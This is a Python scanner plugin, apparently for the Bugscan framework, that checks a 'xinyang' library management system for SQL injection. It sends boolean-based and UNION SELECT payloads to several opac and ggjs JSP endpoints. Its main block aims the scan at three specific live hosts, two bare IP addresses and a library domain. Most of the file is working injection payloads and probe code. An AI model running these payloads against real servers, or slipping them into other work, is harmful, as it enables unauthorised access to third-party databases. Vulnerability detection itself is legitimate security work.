#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0132731
#refer:http://www.wooyun.org/bugs/wooyun-2010-0132188

import re

def assign(service, arg):
    if service == "xinyang":
        return True, arg
        
        
def audit(arg): 
    payloads = [
        'ggjs/dzxx/dzxmjsajax.jsp?nameparm=-1',
        'ggjs/dzxx/dzxmjs.jsp?nameparm=-1',
        'ggjs/wsfb/getejdw.jsp?yjdw=-1',
        'ggjs/zdjk/getjstj.jsp?kid=-1',
        ]
    getdata1 = '%27%20or%20%271%27%3D%271'
    getdata2 = '%27%20or%20%271%27%3D%272'
    for payload in payloads:
        url1 = arg + payload +getdata1
        url2 = arg + payload + getdata2
        code1, head, res1, errcode, _ = curl.curl2(url1)
        code2, head, res2, errcode, _ = curl.curl2(url2)  
        m1 = re.findall('0',res1)
        m2 = re.findall('0',res2)
        if code1 == 200 and code2 ==200 and  m1!=m2 :
            security_hole(arg+payload+'   :found sql Injection')
            
    
    payload = 'opac/xskp.jsp'
    postdata = 'kzh=zyk0040640%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2883%29%7C%7CCHR%2871%29%7C%7CCHR%2866%29%7C%7CCHR%28105%29%7C%7CCHR%28112%29%7C%7CCHR%28108%29%7C%7CCHR%28115%29%7C%7CCHR%2869%29%7C%7CCHR%2872%29%7C%7CCHR%28110%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%20FROM%20DUAL--%20&dztm=&dctm='
    code, head, res, errcode, _ = curl.curl2(arg+payload,postdata)
    if code == 200 and 'qqvvqSGBiplsEHnqzkzq' in res:
        security_hole(arg+payload+'   :found sql Injection')
        
    
    
    payload = 'opac/ckmarc.jsp'
    postdata1 = 'kzh=zyk0040640%27%20AND%201%3D1%20AND%20%27jyNX%27%3D%27jyNX'
    postdata2 = 'kzh=zyk0040640%27%20AND%201%3D2%20AND%20%27jyNX%27%3D%27jyNX'
    code1, head, res1, errcode, _ = curl.curl2(arg+payload,postdata1)
    code2, head, res2, errcode, _ = curl.curl2(arg+payload,postdata2)
    m1 = re.findall('</td>',res1)
    m2 = re.findall('</td>',res2)
    if code1 ==200 and code2==200 and m1!=m2:
        security_hole(arg+payload+'   :found sql Injection')
        
    payload = 'opac/eaal/eaaldetail.jsp?kzh=zyk0040640'
    getdata1 = '%27%29%20AND%201%3D1%20AND%20%28%27BnFZ%27%3D%27BnFZ'
    getdata2 = '%27%29%20AND%201%3D2%20AND%20%28%27BnFZ%27%3D%27BnFZ'
    code1, head, res1, errcode, _ = curl.curl2(arg+payload+getdata1)
    code2, head, res2, errcode, _ = curl.curl2(arg+payload+getdata2)
    m1 = re.findall('1',res1)
    m2 = re.findall('1',res2)
    if code1==200 and code2 == 200 and m1!=m2:
        security_hole(arg+payload+'   :found sql Injection')


if __name__ == '__main__':
    from dummy import *
    audit(assign('xinyang','http://60.171.185.69:8089/')[1])
    audit(assign('xinyang','http://59.51.114.198:8088/')[1])
    audit(assign('xinyang','http://www.kflib.cn:8090/')[1])